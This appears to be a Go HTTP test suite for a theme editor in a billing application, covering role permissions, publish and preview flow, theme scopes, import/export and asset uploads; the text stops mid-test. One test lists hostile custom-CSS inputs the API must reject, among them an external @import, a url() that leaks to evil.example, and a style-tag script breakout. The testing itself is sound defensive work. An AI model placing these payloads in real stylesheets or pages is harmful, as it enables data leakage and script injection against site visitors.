package httpapi_test

// The theme registry over HTTP (internal/httpapi/theme.go).
//
// # What these tests are for, and what they are not
//
// They are not a re-run of the document validator: internal/theme has its own suite for that. What
// they cover is the part only an HTTP test can: who may do what, what a publish does to the page a
// browser is served, and the four security decisions the handlers make that a unit test of the
// generator cannot see —
//
//   - a draft is invisible to a visitor, and a published revision is not;
//   - `theme:write` cannot publish, and `theme:read` cannot write;
//   - a preview token is bound to a revision, expires, and cannot be forged;
//   - a theme grant does not become the right to rewrite the tenant's branding, mail or invoice.
//
// The last one is the one most worth having: the three new permissions sit next to
// `settings:write`, and the failure mode is a merchandiser quietly acquiring the ability to change
// an invoice template.

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/catalyst/billing/internal/theme"
	"github.com/catalyst/billing/web"
)

// themeEnv is an authenticated server plus the helpers the theme tests need.
type themeEnv struct {
	*authEnv
}

func newThemeEnv(t *testing.T) *themeEnv {
	t.Helper()
	env := &themeEnv{authEnv: newAuthEnv(t)}
	// The embedded frontend, so the shell assertions are about the page a browser is served rather
	// than about a stub. `newAuthEnv` builds an API-only server — the shape an API deployment has — and
	// a theme test without the shell could not see the failure this suite exists to catch: a theme that
	// saves correctly and never reaches a page.
	handler, err := web.New(false)
	if err != nil {
		t.Fatalf("build the web handler: %v", err)
	}
	env.srv.WithWeb(handler.WithTheme(env.srv))
	return env
}

// mutation issues a staff mutation with the CSRF header and an idempotency key.
//
// Both are required by the middleware, and both are per-request facts rather than part of what is
// being tested, so they are set here once instead of in every call.
func (e *themeEnv) mutation(t *testing.T, method, path string, cookie *http.Cookie, csrf string, body any) *httptest.ResponseRecorder {
	t.Helper()
	var reader *bytes.Reader
	if body == nil {
		reader = bytes.NewReader(nil)
	} else {
		raw, err := json.Marshal(body)
		if err != nil {
			t.Fatalf("marshal body: %v", err)
		}
		reader = bytes.NewReader(raw)
	}
	req := httptest.NewRequest(method, path, reader)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-CSRF-Token", csrf)
	req.Header.Set("Idempotency-Key", newIdempotencyKey())
	if cookie != nil {
		req.AddCookie(cookie)
	}
	rec := httptest.NewRecorder()
	e.srv.Handler().ServeHTTP(rec, req)
	return rec
}

// admin signs in an administrator and returns the cookie and CSRF token.
func (e *themeEnv) admin(t *testing.T) (*http.Cookie, string) {
	t.Helper()
	e.createUser(t, "theme-admin@example.test", "a good password 1", "administrator")
	return e.login(t, "theme-admin@example.test", "a good password 1")
}

// decodeRevision reads the `{"revision": ...}` envelope a create/update/publish returns.
func decodeRevision(t *testing.T, rec *httptest.ResponseRecorder) map[string]any {
	t.Helper()
	var body struct {
		Revision map[string]any `json:"revision"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode revision: %v (body %s)", err, rec.Body)
	}
	if body.Revision == nil {
		t.Fatalf("no revision in the response: %s", rec.Body)
	}
	return body.Revision
}

// createDraft creates a draft for a scope and returns its id.
func (e *themeEnv) createDraft(t *testing.T, cookie *http.Cookie, csrf, scope string, body any) string {
	t.Helper()
	rec := e.mutation(t, http.MethodPost, "/api/v1/staff/theme/"+scope+"/draft", cookie, csrf, body)
	if rec.Code != http.StatusCreated {
		t.Fatalf("create draft: status %d, body %s", rec.Code, rec.Body)
	}
	rev := decodeRevision(t, rec)
	id, _ := rev["id"].(string)
	if id == "" {
		t.Fatalf("the draft has no id: %s", rec.Body)
	}
	return id
}

// --------------------------------------------------------------- permissions --

// The studio is gated on theme:read, and an anonymous caller is not signed in.
//
// A resolved palette is not a secret once it is on a page, but the *editor* lists drafts, history
// and the names of the people who published them, which is staff information.
func TestThemeStudioRequiresAStaffSession(t *testing.T) {
	env := newThemeEnv(t)

	for _, path := range []string{
		"/api/v1/staff/theme",
		"/api/v1/staff/theme/presets",
		"/api/v1/staff/theme/panel",
		"/api/v1/staff/theme/assets",
	} {
		if rec := env.get(t, path, nil); rec.Code != http.StatusUnauthorized {
			t.Errorf("anonymous GET %s: status %d, want 401", path, rec.Code)
		}
	}

	// A customer is signed in but has no staff permission at all.
	env.createUser(t, "theme-customer@example.test", "a customer password 1", "")
	cookie, _ := env.login(t, "theme-customer@example.test", "a customer password 1")
	if rec := env.get(t, "/api/v1/staff/theme", cookie); rec.Code != http.StatusForbidden {
		t.Errorf("customer GET /api/v1/staff/theme: status %d, want 403", rec.Code)
	}
}

// A support agent may read the studio and may not write or publish.
//
// This is the split the migration's permission block exists for: support answers "why does our panel
// look like this", which needs the history, and does not decide what it looks like.
func TestThemeReadDoesNotImplyWriteOrPublish(t *testing.T) {
	env := newThemeEnv(t)
	env.createUser(t, "theme-support@example.test", "a good password 1", "support")
	cookie, csrf := env.login(t, "theme-support@example.test", "a good password 1")

	if rec := env.get(t, "/api/v1/staff/theme", cookie); rec.Code != http.StatusOK {
		t.Fatalf("support GET /api/v1/staff/theme: status %d, want 200 (body %s)", rec.Code, rec.Body)
	}
	if rec := env.get(t, "/api/v1/staff/theme/panel", cookie); rec.Code != http.StatusOK {
		t.Fatalf("support GET the panel scope: status %d, want 200", rec.Code)
	}

	rec := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/panel/draft", cookie, csrf,
		map[string]string{"preset": "brutalist"})
	if rec.Code != http.StatusForbidden {
		t.Fatalf("support create draft: status %d, want 403", rec.Code)
	}
}

// A billing clerk may draft and may not publish.
//
// Publishing panel custom CSS can hide staff-critical UI; drafting a storefront theme cannot. The two
// are separate permissions precisely so this account can do the first and not the second.
func TestThemeWriteDoesNotImplyPublish(t *testing.T) {
	env := newThemeEnv(t)
	env.createUser(t, "theme-billing@example.test", "a good password 1", "billing")
	cookie, csrf := env.login(t, "theme-billing@example.test", "a good password 1")

	id := env.createDraft(t, cookie, csrf, "storefront", map[string]string{"preset": "warm-saas"})

	rec := env.mutation(t, http.MethodPost,
		"/api/v1/staff/theme/revisions/"+id+"/publish", cookie, csrf, map[string]string{"note": "x"})
	if rec.Code != http.StatusForbidden {
		t.Fatalf("billing publish: status %d, want 403 (body %s)", rec.Code, rec.Body)
	}

	// And the draft is still a draft: a refused publish must not have marked it live on its way to
	// the 403.
	rec = env.get(t, "/api/v1/staff/theme/storefront", cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("read the scope: status %d", rec.Code)
	}
	var body struct {
		Published map[string]any   `json:"published"`
		Drafts    []map[string]any `json:"drafts"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if body.Published != nil {
		t.Fatal("a refused publish published the revision")
	}
	if len(body.Drafts) != 1 {
		t.Fatalf("%d drafts, want 1", len(body.Drafts))
	}
}

// A theme grant must not become the right to rewrite the tenant's identity.
//
// `/api/v1/staff/branding` is the display name and the logo; mail branding and the invoice template
// are behind their own settings groups. They keep `settings:write`, and this test is what stops a
// future refactor from folding them into `theme:write` because "it is all appearance".
func TestThemeWriteDoesNotReachBranding(t *testing.T) {
	env := newThemeEnv(t)
	env.createUser(t, "theme-merch@example.test", "a good password 1", "billing")
	cookie, csrf := env.login(t, "theme-merch@example.test", "a good password 1")

	// The billing clerk holds theme:write and theme:read.
	if rec := env.get(t, "/api/v1/staff/theme", cookie); rec.Code != http.StatusOK {
		t.Fatalf("the clerk cannot read the studio: %d", rec.Code)
	}

	// The branding writer needs settings:write, which this role does not hold.
	rec := env.mutation(t, http.MethodPut, "/api/v1/staff/branding", cookie, csrf,
		map[string]string{"display_name": "Hijacked"})
	if rec.Code != http.StatusForbidden {
		t.Fatalf("a theme grant reached the branding endpoint: status %d (body %s)", rec.Code, rec.Body)
	}
}

// ------------------------------------------------------------------ the flow --

// The whole feature in one test: draft, publish, and the page a visitor is served changes.
//
// The assertions are on the *served* shell and stylesheet rather than on the API's own answer,
// because the failure this is guarding against is a document that saves correctly and never reaches
// a browser.
func TestPublishingAThemeReachesThePage(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	// Before: no published theme, so the scope serves the built-in default.
	manifest := env.get(t, "/api/v1/theme/storefront", nil)
	if manifest.Code != http.StatusOK {
		t.Fatalf("anonymous storefront manifest: status %d (body %s)", manifest.Code, manifest.Body)
	}
	var before struct {
		Revision  string `json:"revision"`
		Published bool   `json:"published"`
	}
	if err := json.Unmarshal(manifest.Body.Bytes(), &before); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if before.Published {
		t.Fatalf("a fresh installation already has a published storefront theme (%s)", before.Revision)
	}
	if before.Revision != "default" {
		t.Fatalf("the unpublished revision is %q, want \"default\"", before.Revision)
	}

	// Publish a preset.
	id := env.createDraft(t, cookie, csrf, "storefront", map[string]string{"preset": "brutalist"})
	rec := env.mutation(t, http.MethodPost,
		"/api/v1/staff/theme/revisions/"+id+"/publish", cookie, csrf, map[string]string{"note": "test"})
	if rec.Code != http.StatusOK {
		t.Fatalf("publish: status %d (body %s)", rec.Code, rec.Body)
	}

	// After: the manifest is published, and it names a revision-addressed stylesheet.
	manifest = env.get(t, "/api/v1/theme/storefront", nil)
	if err := json.Unmarshal(manifest.Body.Bytes(), &before); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if !before.Published {
		t.Fatal("the storefront manifest still says nothing is published")
	}

	var published struct {
		Revision string `json:"revision"`
		CSS      string `json:"css"`
		Meta     struct {
			ColorScheme string `json:"color_scheme"`
			Nav         string `json:"nav"`
			CardStyle   string `json:"card_style"`
		} `json:"meta"`
		Document theme.Document `json:"document"`
	}
	if err := json.Unmarshal(manifest.Body.Bytes(), &published); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if published.Revision == "default" {
		t.Fatal("a published theme still reports the default revision")
	}
	if published.CSS != "/theme/r/"+published.Revision+"/theme.css" {
		t.Fatalf("the stylesheet URL %q is not revision-addressed", published.CSS)
	}
	// The shell shape follows the document: brutalist is light, square and a topbar.
	if published.Meta.ColorScheme != "light" {
		t.Errorf("color_scheme = %q, want light", published.Meta.ColorScheme)
	}
	if published.Meta.Nav != "topbar" {
		t.Errorf("nav = %q, want topbar", published.Meta.Nav)
	}
	if got := published.Document.Shape.Radius.MD; got != "0px" {
		t.Errorf("radius.md = %q, want 0px", got)
	}

	// The stylesheet is served, immutable, and carries the published radius.
	sheet := env.get(t, published.CSS, nil)
	if sheet.Code != http.StatusOK {
		t.Fatalf("GET %s: status %d (body %s)", published.CSS, sheet.Code, sheet.Body)
	}
	if got := sheet.Header().Get("Cache-Control"); !strings.Contains(got, "immutable") {
		t.Errorf("Cache-Control = %q, want immutable", got)
	}
	if got := sheet.Header().Get("Content-Type"); !strings.HasPrefix(got, "text/css") {
		t.Errorf("Content-Type = %q, want text/css", got)
	}
	if !strings.Contains(sheet.Body.String(), "--radius-md: 0px") {
		t.Error("the published stylesheet does not carry the published radius")
	}

	// The shell a visitor is served links that stylesheet and carries the theme's mode.
	shell := env.get(t, "/", nil)
	if shell.Code != http.StatusOK {
		t.Fatalf("GET /: status %d", shell.Code)
	}
	html := shell.Body.String()
	if !strings.Contains(html, published.CSS) {
		t.Errorf("the shell does not link %s", published.CSS)
	}
	// Brutalist is a light-first preset, so the shell's cold mode is light. The *default* document is
	// `system`, which is why this assertion is made against a published preset rather than against a
	// fresh installation: a theme that states a mode must be able to set it, and the built-in default
	// must not.
	if !strings.Contains(html, `data-theme="light"`) {
		t.Error("the shell does not carry the published theme's default mode")
	}
	if !strings.Contains(html, `data-shell="topbar"`) {
		t.Error("the shell does not carry the theme's nav variant")
	}
	// The shell is never cached: a cached shell is how a deploy leaves every returning user on the
	// previous bundle.
	if got := shell.Header().Get("Cache-Control"); got != "no-store" {
		t.Errorf("shell Cache-Control = %q, want no-store", got)
	}
	// And the placeholders are all resolved: a literal marker on the page is a broken render.
	for _, marker := range []string{"{{THEME_", "{{STYLE}}", "{{SCRIPT}}"} {
		if strings.Contains(html, marker) {
			t.Errorf("the shell still contains the unresolved marker %s", marker)
		}
	}
}

// A draft is invisible to a visitor.
//
// This is the property that makes a draft safe to leave open for a week: nothing an operator types
// reaches anybody until they publish it.
func TestADraftIsInvisibleToVisitors(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "neon-terminal"})

	manifest := env.get(t, "/api/v1/theme", cookie)
	var body struct {
		Published bool   `json:"published"`
		Revision  string `json:"revision"`
		CSS       string `json:"css"`
	}
	if err := json.Unmarshal(manifest.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if body.Published {
		t.Fatal("an unpublished draft is being served as the published theme")
	}
	if body.Revision != "default" {
		t.Fatalf("revision = %q, want default", body.Revision)
	}

	// And the stylesheet route for the draft's own digest is not reachable, because the draft is not
	// published: the preview is the only way to see it, and that needs a signed token.
	rec := env.get(t, "/api/v1/staff/theme/panel", cookie)
	var scope struct {
		Drafts []struct {
			Digest string `json:"digest"`
		} `json:"drafts"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &scope); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(scope.Drafts) != 1 {
		t.Fatalf("%d drafts, want 1", len(scope.Drafts))
	}
}

// One open draft per theme, and creating a new one archives the old one.
//
// With two, "Save" would write to whichever the page happened to load last.
func TestCreatingADraftArchivesThePreviousOne(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	first := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "brutalist"})
	second := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "warm-saas"})
	if first == second {
		t.Fatal("the second draft reused the first revision")
	}

	rec := env.get(t, "/api/v1/staff/theme/panel", cookie)
	var body struct {
		Drafts []map[string]any `json:"drafts"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(body.Drafts) != 1 {
		t.Fatalf("%d open drafts, want 1", len(body.Drafts))
	}
	if got, _ := body.Drafts[0]["id"].(string); got != second {
		t.Fatalf("the open draft is %s, want the newest (%s)", got, second)
	}
}

// Publishing twice leaves exactly one published revision, and the history records both.
func TestPublishingTwiceKeepsOnePublishedRevision(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	first := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "brutalist"})
	if rec := env.mutation(t, http.MethodPost,
		"/api/v1/staff/theme/revisions/"+first+"/publish", cookie, csrf, nil); rec.Code != http.StatusOK {
		t.Fatalf("publish 1: %d", rec.Code)
	}
	second := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "neon-terminal"})
	if rec := env.mutation(t, http.MethodPost,
		"/api/v1/staff/theme/revisions/"+second+"/publish", cookie, csrf, nil); rec.Code != http.StatusOK {
		t.Fatalf("publish 2: %d", rec.Code)
	}

	rec := env.get(t, "/api/v1/staff/theme/panel", cookie)
	var body struct {
		Published map[string]any   `json:"published"`
		History   []map[string]any `json:"history"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if got, _ := body.Published["id"].(string); got != second {
		t.Fatalf("the published revision is %s, want the second (%s)", got, second)
	}
	if len(body.History) != 2 {
		t.Fatalf("%d publications in the history, want 2", len(body.History))
	}
	// The second publication names the first as what it replaced, which is what makes a rollback one
	// click rather than an archaeology exercise.
	if got, _ := body.History[0]["previous_revision_id"].(string); got != first {
		t.Errorf("the newest publication replaced %q, want %q", got, first)
	}
}

// A published revision cannot be edited: it is a promise about what a live site serves.
func TestAPublishedRevisionCannotBeEdited(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	id := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "brutalist"})
	if rec := env.mutation(t, http.MethodPost,
		"/api/v1/staff/theme/revisions/"+id+"/publish", cookie, csrf, nil); rec.Code != http.StatusOK {
		t.Fatalf("publish: %d", rec.Code)
	}

	doc := theme.Default()
	doc.ID = "edited"
	doc.Name = "Edited"
	rec := env.mutation(t, http.MethodPut, "/api/v1/staff/theme/revisions/"+id, cookie, csrf,
		map[string]any{"document": doc})
	if rec.Code != http.StatusConflict {
		t.Fatalf("editing a published revision: status %d, want 409 (body %s)", rec.Code, rec.Body)
	}
	if !strings.Contains(rec.Body.String(), "not_a_draft") {
		t.Errorf("the problem code does not name the reason: %s", rec.Body)
	}
}

// Restoring an old revision creates a new draft from its *source*, not its resolved document.
//
// The distinction matters: a storefront theme that inherits the panel should re-resolve against
// today's panel, not freeze the panel as it was when revision 3 was written.
func TestRestoreCreatesADraftFromTheSource(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	first := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "brutalist"})
	env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "warm-saas"})

	rec := env.mutation(t, http.MethodPost,
		"/api/v1/staff/theme/revisions/"+first+"/restore", cookie, csrf, nil)
	if rec.Code != http.StatusCreated {
		t.Fatalf("restore: status %d (body %s)", rec.Code, rec.Body)
	}
	rev := decodeRevision(t, rec)
	if got, _ := rev["status"].(string); got != "draft" {
		t.Fatalf("the restored revision has status %q, want draft", got)
	}
	// The restored draft carries brutalist's square corners, which is what the source said.
	doc, ok := rev["source"].(map[string]any)
	if !ok {
		t.Fatalf("the restored revision has no source document: %s", rec.Body)
	}
	shape, _ := doc["shape"].(map[string]any)
	radius, _ := shape["radius"].(map[string]any)
	if got, _ := radius["md"].(string); got != "0px" {
		t.Errorf("the restored source has radius.md %q, want 0px (brutalist)", got)
	}
}

// The custom-CSS gate refuses the constructs a stylesheet must not carry, through the API.
//
// The parser has its own corpus in internal/theme; this asserts that the handler actually runs it,
// which is the part that a refactor could drop without any unit test noticing.
func TestCustomCSSIsValidatedOnSave(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	for _, css := range []string{
		`@import url("https://evil.example/x.css");`,
		`.card { background: url(https://evil.example/?leak); }`,
		`.card { behavior: url(x); }`,
		`@\69mport "x.css";`,
		`</style><script>alert(1)</script>`,
	} {
		doc := theme.Default()
		doc.CustomCSS = css
		rec := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/panel/draft", cookie, csrf,
			map[string]any{"document": doc})
		if rec.Code != http.StatusUnprocessableEntity {
			t.Errorf("custom CSS %q: status %d, want 422 (body %s)", css, rec.Code, rec.Body)
			continue
		}
		if !strings.Contains(rec.Body.String(), "customCss") {
			t.Errorf("custom CSS %q: the error does not name the field: %s", css, rec.Body)
		}
	}

	// And a legitimate stylesheet is accepted, so the gate is not simply refusing everything.
	doc := theme.Default()
	doc.CustomCSS = `.card { border-radius: 0; }`
	rec := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/panel/draft", cookie, csrf,
		map[string]any{"document": doc})
	if rec.Code != http.StatusCreated {
		t.Fatalf("a legitimate stylesheet was refused: status %d (body %s)", rec.Code, rec.Body)
	}
}

// An unknown key is refused, and the error names it.
//
// A validator that ignored `colour` would accept a document that changes nothing while the operator
// watches their edit do nothing.
func TestAnUnknownDocumentKeyIsRefusedByName(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	raw := map[string]any{
		"schema": theme.SchemaVersion,
		"id":     "typo",
		"name":   "Typo",
		"colour": map[string]any{"mode": "dark"},
	}
	rec := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/panel/draft", cookie, csrf,
		map[string]any{"document": raw})
	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("status %d, want 422 (body %s)", rec.Code, rec.Body)
	}
	if !strings.Contains(rec.Body.String(), "colour") {
		t.Errorf("the error does not name the unknown key: %s", rec.Body)
	}
}

// ------------------------------------------------------------------ preview --

// A preview token renders an unpublished draft, is bound to it, and cannot be forged.
func TestPreviewTokenRendersTheDraftAndCannotBeForged(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	id := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "neon-terminal"})
	rec := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/preview-token", cookie, csrf,
		map[string]any{"revision_id": id, "scope": "panel"})
	if rec.Code != http.StatusOK {
		t.Fatalf("mint: status %d (body %s)", rec.Code, rec.Body)
	}
	var minted struct {
		URL string `json:"url"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &minted); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if minted.URL == "" {
		t.Fatal("no preview URL")
	}

	// The preview renders the draft's shell, and is the one response that may be framed — by its own
	// origin only.
	preview := env.get(t, minted.URL, nil)
	if preview.Code != http.StatusOK {
		t.Fatalf("preview: status %d (body %s)", preview.Code, preview.Body)
	}
	csp := preview.Header().Get("Content-Security-Policy")
	if !strings.Contains(csp, "frame-ancestors 'self'") {
		t.Errorf("the preview's frame-ancestors is not 'self': %s", csp)
	}
	if !strings.Contains(preview.Header().Get("X-Robots-Tag"), "noindex") {
		t.Error("the preview is indexable")
	}
	if preview.Header().Get("Cache-Control") != "no-store" {
		t.Error("the preview is cacheable")
	}
	// The preview is the draft's shell, so it links the draft's own stylesheet — which is the
	// assertion that matters: a preview that rendered the live theme would look right and prove
	// nothing.
	var draftSheet struct {
		Drafts []struct {
			Digest string `json:"digest"`
		} `json:"drafts"`
	}
	scopeRec := env.get(t, "/api/v1/staff/theme/panel", cookie)
	if err := json.Unmarshal(scopeRec.Body.Bytes(), &draftSheet); err != nil {
		t.Fatalf("decode the scope: %v", err)
	}
	segment := strings.TrimPrefix(draftSheet.Drafts[0].Digest, "sha256:")
	if !strings.Contains(preview.Body.String(), "/theme/r/"+segment+"/theme.css") {
		t.Error("the preview does not link the draft's own stylesheet")
	}
	if !strings.Contains(preview.Body.String(), "Neon Terminal") {
		t.Error("the preview does not name the draft it is previewing")
	}

	// Every other response keeps `frame-ancestors 'none'`: the widening is scoped to the preview.
	shell := env.get(t, "/", nil)
	if !strings.Contains(shell.Header().Get("Content-Security-Policy"), "frame-ancestors 'none'") {
		t.Error("the live shell no longer forbids framing")
	}

	// A forged signature is refused, and the refusal does not say which half was wrong.
	forged := strings.Replace(minted.URL, "token=", "token=x", 1)
	if rec := env.get(t, forged, nil); rec.Code != http.StatusForbidden {
		t.Errorf("a forged token: status %d, want 403", rec.Code)
	}
	// A token with no signature at all is refused.
	if rec := env.get(t, "/theme/preview?scope=panel&token=abc", nil); rec.Code != http.StatusForbidden {
		t.Errorf("an unsigned token: status %d, want 403", rec.Code)
	}
	// No token at all is refused rather than rendering the default.
	if rec := env.get(t, "/theme/preview?scope=panel", nil); rec.Code != http.StatusForbidden {
		t.Errorf("no token: status %d, want 403", rec.Code)
	}
}

// A preview token for a deleted revision stops working.
func TestPreviewTokenForAMissingRevisionIsRefused(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	rec := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/preview-token", cookie, csrf,
		map[string]any{"revision_id": "00000000-0000-4000-8000-000000000000"})
	if rec.Code != http.StatusNotFound {
		t.Fatalf("minting a token for a missing revision: status %d, want 404", rec.Code)
	}
}

// -------------------------------------------------------------------- scopes --

// Scopes are independent: publishing the panel does not repaint the shop.
//
// This is the property the storefront scope exists for, and the one an inheritance bug would break
// silently: the shop would simply wear the staff panel's palette and nobody would see an error.
func TestScopesAreIndependent(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	panelID := env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "brutalist"})
	if rec := env.mutation(t, http.MethodPost,
		"/api/v1/staff/theme/revisions/"+panelID+"/publish", cookie, csrf, nil); rec.Code != http.StatusOK {
		t.Fatalf("publish the panel: %d", rec.Code)
	}

	var panel, shop struct {
		Digest    string `json:"digest"`
		Published bool   `json:"published"`
	}
	rec := env.get(t, "/api/v1/theme", cookie)
	if err := json.Unmarshal(rec.Body.Bytes(), &panel); err != nil {
		t.Fatalf("decode the panel manifest: %v", err)
	}
	rec = env.get(t, "/api/v1/theme/storefront", nil)
	if err := json.Unmarshal(rec.Body.Bytes(), &shop); err != nil {
		t.Fatalf("decode the storefront manifest: %v", err)
	}

	if !panel.Published {
		t.Fatal("the panel publish did not reach the panel manifest")
	}
	if shop.Published {
		t.Fatal("the storefront is serving the panel's published theme")
	}
	if panel.Digest == shop.Digest {
		t.Fatal("the panel and the storefront have the same digest")
	}
}

// An unknown scope is a 404 with a code, not a 500 and not the panel.
func TestUnknownScopeIsRefused(t *testing.T) {
	env := newThemeEnv(t)
	cookie, _ := env.admin(t)

	rec := env.get(t, "/api/v1/staff/theme/invoices", cookie)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status %d, want 404 (body %s)", rec.Code, rec.Body)
	}
	if !strings.Contains(rec.Body.String(), "unknown_scope") {
		t.Errorf("the problem code does not name the reason: %s", rec.Body)
	}
	// The public manifest refuses it too, rather than falling back to the caller's own scope.
	if rec := env.get(t, "/api/v1/theme/invoices", cookie); rec.Code != http.StatusNotFound {
		t.Errorf("public manifest for an unknown scope: status %d, want 404", rec.Code)
	}
}

// ------------------------------------------------------------------- export --

// An export is deterministic and carries the source document, so it can be committed and diffed.
func TestExportIsDeterministicAndCarriesTheSource(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	env.createDraft(t, cookie, csrf, "panel", map[string]string{"preset": "editorial-paper"})

	first := env.get(t, "/api/v1/staff/theme/panel/export", cookie)
	if first.Code != http.StatusOK {
		t.Fatalf("export: status %d (body %s)", first.Code, first.Body)
	}
	var envelope struct {
		Kind   string         `json:"kind"`
		Schema int            `json:"schema"`
		Theme  map[string]any `json:"theme"`
	}
	if err := json.Unmarshal(first.Body.Bytes(), &envelope); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if envelope.Kind != "catalyst.theme" {
		t.Errorf("kind = %q", envelope.Kind)
	}
	if envelope.Schema != theme.SchemaVersion {
		t.Errorf("schema = %d, want %d", envelope.Schema, theme.SchemaVersion)
	}
	// The exported document is a *layer*, not a resolved document: it should still carry the preset's
	// own id rather than a name invented by the resolver.
	if got, _ := envelope.Theme["id"].(string); got != "editorial-paper" {
		t.Errorf("the exported source has id %q, want editorial-paper", got)
	}
	// Only `exported_at` may differ between two exports, so the envelope is comparable after it is
	// removed. That is what makes it a file worth committing.
	second := env.get(t, "/api/v1/staff/theme/panel/export", cookie)
	if got := stripExportedAt(t, first.Body.Bytes()); got != stripExportedAt(t, second.Body.Bytes()) {
		t.Error("two exports of the same theme differ")
	}
}

// stripExportedAt removes the one timestamp an export is allowed to vary.
func stripExportedAt(t *testing.T, body []byte) string {
	t.Helper()
	var parsed map[string]any
	if err := json.Unmarshal(body, &parsed); err != nil {
		t.Fatalf("decode: %v", err)
	}
	delete(parsed, "exported_at")
	raw, err := json.Marshal(parsed)
	if err != nil {
		t.Fatalf("re-encode: %v", err)
	}
	return string(raw)
}

// Importing the same envelope twice does not create a second identical draft.
func TestImportIsIdempotentOnTheDigest(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	envelope := map[string]any{
		"kind":        "catalyst.theme",
		"schema":      theme.SchemaVersion,
		"exported_at": "2026-01-01T00:00:00Z",
		"theme": map[string]any{
			"schema": theme.SchemaVersion,
			"id":     "imported",
			"name":   "Imported",
			"color": map[string]any{
				"mode":     "dark",
				"brand":    map[string]any{"primary": "#3366ff"},
				"semantic": map[string]any{},
				"dark":     map[string]any{},
				"light":    map[string]any{},
			},
		},
	}

	first := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/import?scope=panel", cookie, csrf, envelope)
	if first.Code != http.StatusCreated {
		t.Fatalf("import: status %d (body %s)", first.Code, first.Body)
	}
	second := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/import?scope=panel", cookie, csrf, envelope)
	if second.Code != http.StatusOK {
		t.Fatalf("re-import: status %d, want 200 with unchanged (body %s)", second.Code, second.Body)
	}
	if !strings.Contains(second.Body.String(), `"unchanged":true`) {
		t.Errorf("the second import did not report unchanged: %s", second.Body)
	}
}

// An envelope of the wrong kind or schema is refused with a code that says which.
func TestImportRefusesAnUnknownEnvelope(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	for _, tc := range []struct {
		name string
		body map[string]any
		want string
	}{
		{"wrong kind", map[string]any{"kind": "pterodactyl.egg", "schema": theme.SchemaVersion}, "invalid_envelope"},
		{"wrong schema", map[string]any{"kind": "catalyst.theme", "schema": 99}, "unsupported_schema"},
	} {
		rec := env.mutation(t, http.MethodPost, "/api/v1/staff/theme/import?scope=panel", cookie, csrf, tc.body)
		if rec.Code != http.StatusUnprocessableEntity {
			t.Errorf("%s: status %d, want 422 (body %s)", tc.name, rec.Code, rec.Body)
			continue
		}
		if !strings.Contains(rec.Body.String(), tc.want) {
			t.Errorf("%s: the problem code is not %s: %s", tc.name, tc.want, rec.Body)
		}
	}
}

// ------------------------------------------------------------------- assets --

// An upload is checked, not trusted: a file that is not what it claims is refused.
func TestThemeAssetUploadValidatesTheBytes(t *testing.T) {
	env := newThemeEnv(t)
	cookie, csrf := env.admin(t)

	// A PNG content type with JPEG-in-name garbage: refused by the decoder, not by a file extension.
	rec := env.upload(t, cookie, csrf, "background", "image/png", []byte("not a png at all"))
	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("a non-image declared as PNG: status %d, want 422 (body %s)", rec.Code, rec.Body)
	}
	// A type outside the allowlist is refused before the bytes are read.
	rec = env.upload(t, cookie, csrf, "background", "image/svg+xml", []byte("<svg/>"))
	if rec.Code != http.StatusUnsupportedMediaType {
